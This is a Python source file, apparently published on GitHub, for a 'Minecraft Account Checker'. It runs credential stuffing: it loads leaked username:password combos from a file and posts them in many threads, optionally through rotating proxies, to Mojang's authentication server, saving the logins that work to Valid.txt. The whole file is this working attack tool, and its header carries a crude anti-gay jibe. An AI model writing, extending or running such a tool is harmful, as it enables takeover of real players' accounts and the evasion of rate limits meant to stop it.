# ------------------------------
# Made by aggro
# github.com/aggroxx
# skid=gay
# ------------------------------

import threading, requests, random, os, ctypes
from colorama import Fore
from time import sleep

usernames=[]
passwords=[]

def cls():
    os.system('cls')

def logo():
    print()
    print(Fore.RESET+'███╗░░░███╗░█████╗░  ░█████╗░██╗░░██╗███████╗░█████╗░██╗░░██╗███████╗██████╗░')
    sleep(.1)
    print(Fore.RED+'████╗░████║██╔══██╗  ██╔══██╗██║░░██║██╔════╝██╔══██╗██║░██╔╝██╔════╝██╔══██╗')
    sleep(.1)
    print(Fore.RESET+'██╔████╔██║██║░░╚═╝  ██║░░╚═╝███████║█████╗░░██║░░╚═╝█████═╝░█████╗░░██████╔╝')
    sleep(.1)
    print(Fore.RED+'██║╚██╔╝██║██║░░██╗  ██║░░██╗██╔══██║██╔══╝░░██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗')
    sleep(.1)
    print(Fore.RESET+'██║░╚═╝░██║╚█████╔╝  ╚█████╔╝██║░░██║███████╗╚█████╔╝██║░╚██╗███████╗██║░░██║')
    sleep(.1)
    print(Fore.RED+'╚═╝░░░░░╚═╝░╚════╝░  ░╚════╝░╚═╝░░╚═╝╚══════╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝')
    print(Fore.RESET+'                                 github.com/aggroxx')
    print()
    print()

def combos():
    if os.path.exists("combo.txt"):
        with open("combo.txt", "r") as f:
            for line in f.read().splitlines():
                if ':' in line:
                    usernames.append(line.split(':')[0])
                    passwords.append(line.split(':')[-1])
        return True
    else:
        return False

def checker(p, username, password):
    url="https://authserver.mojang.com/authenticate"
    proxies = {'http': 'http://' + random.choice(open('proxies.txt', 'r').read().split('\n'))}
    json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
    headers={"User-Agent": "MinecraftLauncher/1.0"}
    if p==True:
        r = requests.post(url, json=json, headers=headers, proxies=proxies)
        if r.status_code==200:
            with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
            print(f'{Fore.RESET}{username}:{password} | {Fore.GREEN}Valid')
            print()
        else:
            print(f'{Fore.RESET}{username}:{password} | {Fore.RED}Invalid')
            print()
    else:
        r = requests.post(url, json=json, headers=headers)
        if r.status_code==200:
            with open("Valid.txt", "a") as f: f.write("{}:{}\n".format(username, password))
            print(f'{Fore.RESET}{username}:{password} | {Fore.GREEN}Valid')
            print()
        else:
            print(f'{Fore.RESET}{username}:{password} | {Fore.RED}Invalid')
            print()

def threads(p,threadss):
    cls()
    logo()
    print(Fore.RED+"All the Valid accounts are going to be saved in 'valid.txt'")
    print()
    def start():
        checker(p, usernames[count], passwords[count])
    count=0
    while True:
            if threading.active_count() <= threadss:
                threading.Thread(target = start).start()
                count+= 1

            if count >= len(usernames):
                break
    print()
    sleep(999999)

def proxyask():
    cls()
    logo()
    proxies=input('{}proxies? {}(y/n): '.format(Fore.RED, Fore.RESET))
    if proxies=='y':
        if os.path.exists("proxies.txt"):
            return True
        else:
            cls()
            logo()
            ("{}'proxies.txt' not found.".format(Fore.RED))
            sleep(3)
            os.sys.exit(0)
    else:
        return False

def main():
    cls()
    logo()
    print(Fore.RED)
    os.system('pause')
    load_accounts=combos()
    if load_accounts==True:
        cls()
        f=proxyask()
        if f==True:
            p=True
            cls()
            logo()
            threadss=int(input((("{}How many threads? {}".format(Fore.RED, Fore.RESET)))))
            threads(p, threadss)
        else:
            p=False
            cls()
            logo()
            threadss=int(input((("{}How many threads? {}".format(Fore.RED, Fore.RESET)))))
            threads(p, threadss)
    else:
        print()
        print("{}'combo.txt' not found.".format(Fore.RED))
        sleep(3)
        main()

ctypes.windll.kernel32.SetConsoleTitleW('Minecraft Account Checker | github.com/aggroxx')
main()
